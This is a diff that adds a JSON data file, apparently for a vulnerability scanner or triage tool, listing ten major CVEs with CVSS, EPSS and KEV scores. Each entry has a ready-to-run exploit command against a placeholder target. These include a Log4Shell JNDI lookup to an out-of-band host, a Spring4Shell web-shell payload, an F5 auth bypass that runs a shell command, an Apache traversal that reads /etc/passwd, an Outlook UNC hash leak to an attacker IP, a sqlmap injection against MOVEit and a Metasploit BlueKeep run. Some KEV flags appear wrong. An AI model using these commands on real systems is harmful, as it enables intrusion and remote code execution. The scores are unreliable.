@@ -1,0 +1,99 @@
+[
+  {
+    "id": "CVE-2021-44228",
+    "description": "Log4Shell — JNDI injection in Apache Log4j2",
+    "cvss": 10.0,
+    "epss": 0.97,
+    "kev": 1.0,
+    "nuclei_tag": "cve-2021-44228",
+    "poc_command": "curl -s -H 'X-Api-Version: ${jndi:ldap://OOB_HOST/a}' TARGET_URL",
+    "references": ["https://nvd.nist.gov/vuln/detail/CVE-2021-44228"]
+  },
+  {
+    "id": "CVE-2022-22965",
+    "description": "Spring4Shell — RCE in Spring Framework",
+    "cvss": 9.8,
+    "epss": 0.95,
+    "kev": 1.0,
+    "nuclei_tag": "cve-2022-22965",
+    "poc_command": "curl -s -d 'class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20Runtime.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()' TARGET_URL",
+    "references": ["https://nvd.nist.gov/vuln/detail/CVE-2022-22965"]
+  },
+  {
+    "id": "CVE-2021-26855",
+    "description": "ProxyLogon — Exchange Server SSRF",
+    "cvss": 9.8,
+    "epss": 0.92,
+    "kev": 1.0,
+    "nuclei_tag": "CVE-2021-26855",
+    "poc_command": "curl -k -s 'https://TARGET_URL/ecp/y.js' -H 'Cookie: X-AnonResource=true; X-AnonResource-Backend=localhost/ecp/default.flt?~3; X-BEResource=localhost/owa/auth/logon.aspx?~3;'",
+    "references": ["https://nvd.nist.gov/vuln/detail/CVE-2021-26855"]
+  },
+  {
+    "id": "CVE-2022-1388",
+    "description": "F5 BIG-IP iControl REST auth bypass",
+    "cvss": 9.8,
+    "epss": 0.88,
+    "kev": 1.0,
+    "nuclei_tag": "cve-2022-1388",
+    "poc_command": "curl -sk -X POST https://TARGET_URL/mgmt/tm/util/bash -H 'Authorization: Basic <BASE64_ENCODED_CREDS>' -H 'X-F5-Auth-Token: a' -H 'Content-Type: application/json' -d '{\"command\":\"run\",\"utilCmdArgs\":\"-c id\"}'",
+    "references": ["https://nvd.nist.gov/vuln/detail/CVE-2022-1388"]
+  },
+  {
+    "id": "CVE-2023-44487",
+    "description": "HTTP/2 Rapid Reset DoS",
+    "cvss": 7.5,
+    "epss": 0.85,
+    "kev": 0.0,
+    "poc_command": "# HTTP/2 Rapid Reset — use: h2load -n 1000 -c 100 -m 100 TARGET_URL",
+    "references": ["https://nvd.nist.gov/vuln/detail/CVE-2023-44487"]
+  },
+  {
+    "id": "CVE-2021-41773",
+    "description": "Apache 2.4.49 path traversal / RCE",
+    "cvss": 9.8,
+    "epss": 0.75,
+    "kev": 0.0,
+    "nuclei_tag": "CVE-2021-41773",
+    "poc_command": "curl -s --path-as-is 'TARGET_URL/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd'",
+    "references": ["https://nvd.nist.gov/vuln/detail/CVE-2021-41773"]
+  },
+  {
+    "id": "CVE-2022-0847",
+    "description": "Dirty Pipe — Linux kernel LPE (5.8+)",
+    "cvss": 7.8,
+    "epss": 0.70,
+    "kev": 0.0,
+    "poc_command": "gcc -o /tmp/dirty_pipe CVE-2022-0847.c && /tmp/dirty_pipe /etc/passwd",
+    "references": ["https://nvd.nist.gov/vuln/detail/CVE-2022-0847"]
+  },
+  {
+    "id": "CVE-2023-23397",
+    "description": "Microsoft Outlook NTLM hash leak",
+    "cvss": 9.8,
+    "epss": 0.65,
+    "kev": 1.0,
+    "poc_command": "# Send calendar invite with UNC path: \\\\ATTACKER_IP\\share\\file.mp3",
+    "references": ["https://nvd.nist.gov/vuln/detail/CVE-2023-23397"]
+  },
+  {
+    "id": "CVE-2023-34362",
+    "description": "MOVEit Transfer SQL injection RCE",
+    "cvss": 9.8,
+    "epss": 0.60,
+    "kev": 1.0,
+    "nuclei_tag": "CVE-2023-34362",
+    "poc_command": "sqlmap -u 'TARGET_URL/guestaccess.aspx' --data='LoginForm__Login=a&LoginForm__Password=b' --technique=T --batch --dbs",
+    "references": ["https://nvd.nist.gov/vuln/detail/CVE-2023-34362"]
+  },
+  {
+    "id": "CVE-2019-0708",
+    "description": "BlueKeep — RDP RCE (Windows 7/2008)",
+    "cvss": 9.8,
+    "epss": 0.95,
+    "kev": 0.0,
+    "nuclei_tag": "CVE-2019-0708",
+    "poc_command": "msfconsole -q -x 'use exploit/windows/rdp/cve_2019_0708_bluekeep_rce; set RHOSTS TARGET_IP; run'",
+    "references": ["https://nvd.nist.gov/vuln/detail/CVE-2019-0708"]
+  }
+]
